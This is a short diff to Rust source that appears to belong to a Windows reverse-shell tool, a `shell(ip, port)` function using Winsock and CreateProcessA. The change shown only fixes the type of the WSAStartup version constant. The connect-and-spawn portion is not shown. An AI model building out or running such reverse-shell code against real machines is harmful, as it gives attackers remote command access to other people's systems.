@@ -7,7 +7,7 @@ use windows::Win32::System::Threading::{CreateProcessA, PROCESS_CREATION_FLAGS, 
 
 // https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/ms632663(v=vs.85)
 // Normally this is called by MAKEWORD(2,2), which is 514
-const WSASTARTUPVAL: i32 = 514;
+const WSASTARTUPVAL: u16 = 514;
 // https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsasocketa
 // 2 = AF_INET
 const AF_INET_I32: i32 = 2;
@@ -27,7 +27,7 @@ pub fn shell(ip: &str, port: u16) {
     // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-wsastartup
     // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/Networking/WinSock/fn.WSAStartup.html
     let mut wsa_data: WSAData = unsafe { mem::zeroed() };
-    let wsa_start_result = unsafe { WSAStartup(WSASTARTUPVAL.try_into().unwrap(), &mut wsa_data) };
+    let wsa_start_result = unsafe { WSAStartup(WSASTARTUPVAL, &mut wsa_data) };
     if wsa_start_result != 0 {
         panic!("Unable to call WSAStartup")
     }
